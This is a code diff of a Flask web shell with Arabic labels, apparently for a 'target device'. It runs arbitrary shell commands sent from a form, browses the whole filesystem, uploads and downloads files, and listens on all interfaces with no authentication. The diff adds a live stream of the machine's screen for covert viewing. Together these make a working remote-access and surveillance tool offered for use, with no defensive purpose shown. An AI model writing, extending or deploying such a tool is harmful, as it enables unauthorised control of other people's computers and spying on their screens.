@@ -1,24 +1,64 @@
 # -*- coding: utf-8 -*-
-from flask import Flask, render_template_string, request, send_file, redirect, url_for
+from flask import Flask, render_template_string, request, send_file, Response
 import os
 import subprocess
-import shutil
+import cv2
+import numpy as np
 
 app = Flask(__name__)
 
-# تصميم واجهة احترافية شبيهة بالـ Web Shellز الشهيرة (Dark Hacker Theme)
+# دالة البث الحي لشاشة الجهاز البعيد
+def generate_frames():
+    try:
+        import mss
+        with mss.mss() as sct:
+            monitor = sct.monitors[1]
+            while True:
+                img = np.array(sct.grab(monitor))
+                img = cv2.resize(img, (640, 360))
+                ret, buffer = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 70])
+                frame = buffer.tobytes()
+                yield (b'--frame\r\n'
+                       b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
+    except Exception:
+        while True:
+            blank_img = np.zeros((360, 640, 3), dtype=np.uint8)
+            cv2.putText(blank_img, "Live Stream: No GUI / Display", (50, 180), 
+                        cv2.FONT_HERSHEY_SIMPLEX, 0.7, (0, 255, 0), 2)
+            ret, buffer = cv2.imencode('.jpg', blank_img)
+            frame = buffer.tobytes()
+            yield (b'--frame\r\n'
+                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
+
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>Advanced Python Web Shell</title>
+    <title>Advanced Web Shell with Live Stream</title>
     <style>
         body { background-color: #0d1117; color: #c9d1d9; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 20px; }
         h2 { color: #58a6ff; text-align: center; border-bottom: 2px solid #30363d; padding-bottom: 10px; }
-        .container { max-width: 1100px; margin: auto; background: #161b22; padding: 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-        .section { margin-bottom: 25px; padding: 15px; background: #21262d; border-radius: 6px; border: 1px solid #30363d; }
-        pre { background-color: #010409; color: #7ee787; padding: 15px; border-radius: 5px; max-height: 350px; overflow-y: auto; white-space: pre-wrap; word-wrap: break-word; }
+        .container { max-width: 1200px; margin: auto; background: #161b22; padding: 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); position: relative; }
+        
+        .live-stream-box {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            width: 320px;
+            background: #21262d;
+            border: 2px solid #238636;
+            border-radius: 6px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.8);
+            z-index: 1000;
+            padding: 5px;
+            text-align: center;
+        }
+        .live-stream-box h4 { margin: 5px 0; color: #7ee787; font-size: 14px; }
+        .live-stream-box img { width: 100%; border-radius: 4px; display: block; }
+
+        .section { margin-bottom: 25px; padding: 15px; background: #21262d; border-radius: 6px; border: 1px solid #30363d; max-width: 800px; }
+        pre { background-color: #010409; color: #7ee787; padding: 15px; border-radius: 5px; max-height: 300px; overflow-y: auto; white-space: pre-wrap; word-wrap: break-word; }
         input[type="text"], input[type="file"] { width: 70%; padding: 8px; background: #0d1117; color: #fff; border: 1px solid #30363d; font-family: monospace; border-radius: 4px; }
         input[type="submit"], button { padding: 8px 15px; background: #238636; color: #fff; border: none; font-weight: bold; cursor: pointer; border-radius: 4px; }
         input[type="submit"]:hover, button:hover { background: #2ea043; }
@@ -26,39 +66,41 @@ HTML_TEMPLATE = """
         th, td { padding: 10px; text-align: left; border-bottom: 1px solid #30363d; }
         th { background: #1f6feb; color: white; }
         a { color: #58a6ff; text-decoration: none; }
-        a:hover { text-decoration: underline; }
         .path-bar { font-size: 16px; color: #f0883e; margin-bottom: 10px; }
     </style>
 </head>
 <body>
+
+    <div class="live-stream-box">
+        <h4>🔴 بث مباشر للشاشة</h4>
+        <img src="{{ url_for('video_feed') }}" alt="Live Stream">
+    </div>
+
     <div class="container">
-        <h2>⚡ Advanced System & Disk Web Shell ⚡</h2>
+        <h2>⚡ لوحة التحكم الذكية مع البث المباشر ⚡</h2>
         
-        <!-- معلومات المسار الحالي -->
         <div class="section">
             <div class="path-bar">📁 المسار الحالي: <code>{{ current_path }}</code></div>
             <a href="/?path={{ parent_path }}"><button>⬆ العودة للمجلد الأعلى</button></a>
         </div>
 
-        <!-- قسم تنفيذ الأوامر -->
         <div class="section">
-            <h3>💻 تنفيذ الأوامر (Terminal)</h3>
+            <h3>💻 تنفيذ الأوامر (Terminal & Disk Check)</h3>
             <pre>{{ output }}</pre>
             <form method="POST">
                 <input type="hidden" name="action" value="cmd">
-                <input type="text" name="command" placeholder="اكتب الأمر هنا (مثل: df -h, ls -la, free -m)..." autofocus autocomplete="off">
+                <input type="text" name="command" placeholder="اكتب الأمر (مثل: df -h, ls, free)..." autofocus autocomplete="off">
                 <input type="submit" value="تنفيذ">
             </form>
         </div>
 
-        <!-- قسم استعراض الملفات والأقراص -->
         <div class="section">
-            <h3>📂 استعراض الملفات والمجلدات والأقراص</h3>
+            <h3>📂 استعراض الأقراص والملفات</h3>
             <table>
                 <tr>
                     <th>الاسم</th>
                     <th>النوع</th>
-                    <th>الحجم / الإجراءات</th>
+                    <th>إجراءات</th>
                 </tr>
                 {% for item in items %}
                 <tr>
@@ -80,13 +122,12 @@ HTML_TEMPLATE = """
             </table>
         </div>
 
-        <!-- قسم رفع الملفات -->
         <div class="section">
-            <h3>📤 رفع ملف إلى الجهاز المستهدف</h3>
+            <h3>📤 رفع ملف للجهاز</h3>
             <form method="POST" enctype="multipart/form-data">
                 <input type="hidden" name="action" value="upload">
                 <input type="file" name="file">
-                <input type="submit" value="رفع الملف">
+                <input type="submit" value="رفع">
             </form>
         </div>
     </div>
@@ -96,17 +137,14 @@ HTML_TEMPLATE = """
 
 @app.route("/", methods=["GET", "POST"])
 def index():
-    # تحديد المسار الحالي (افتراضياً مجلد العمل الحالي)
     current_path = request.args.get('path', os.getcwd())
     current_path = os.path.abspath(current_path)
     parent_path = os.path.dirname(current_path)
     
-    output = "أهلاً بك يا محمد! النظام جاهز لإدارة الأقراص والملفات:\n"
+    output = "أهلاً بك يا محمد! نظام التحكم والبث الحي جاهز:\n"
     
     if request.method == "POST":
         action = request.form.get("action")
-        
-        # معالجة تنفيذ الأوامر
         if action == "cmd":
             command = request.form.get("command")
             if command:
@@ -116,8 +154,6 @@ def index():
                     output += res.stdout + res.stderr
                 except Exception as e:
                     output += f"Error: {str(e)}\n"
-                    
-        # معالجة رفع الملفات
         elif action == "upload":
             uploaded_file = request.files.get('file')
             if uploaded_file:
@@ -125,7 +161,6 @@ def index():
                 uploaded_file.save(file_path)
                 output += f"[+] تم رفع الملف بنجاح إلى: {file_path}\n"
 
-    # جلب محتويات المجلد والأقراص
     items = []
     try:
         for entry in os.scandir(current_path):
@@ -135,9 +170,13 @@ def index():
                 'path': entry.path
             })
     except Exception as e:
-        output += f"خطأ في قراءة المجلد: {str(e)}\n"
+        output += f"خطأ: {str(e)}\n"
 
     return render_template_string(HTML_TEMPLATE, current_path=current_path, parent_path=parent_path, output=output, items=items)
+
+@app.route('/video_feed')
+def video_feed():
+    return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
 
 @app.route("/download")
 def download():
@@ -147,5 +186,5 @@ def download():
     return "الملف غير موجود!", 404
 
 if __name__ == "__main__":
-    # يعمل على أي منفذ أكبر من 1024 (مثلاً 8080) بدون روت
     app.run(host="0.0.0.0", port=8080, debug=False)
+    
